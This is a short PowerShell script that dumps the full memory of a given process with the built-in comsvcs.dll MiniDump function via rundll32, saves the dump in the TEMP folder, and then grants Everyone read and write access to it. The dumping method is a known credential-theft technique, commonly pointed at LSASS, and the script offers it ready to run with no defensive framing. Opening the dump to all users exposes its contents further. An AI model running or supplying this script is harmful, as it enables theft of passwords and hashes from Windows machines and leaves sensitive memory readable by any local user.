param($processId)
$dumpFilePath = "$Env:TEMP\memdump.bin.$processId"

Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $processId $dumpFilePath full

icacls $dumpFilePath /remove "Everyone"
icacls $dumpFilePath /grant "Everyone:(r)"
icacls $dumpFilePath /grant "Everyone:(w)"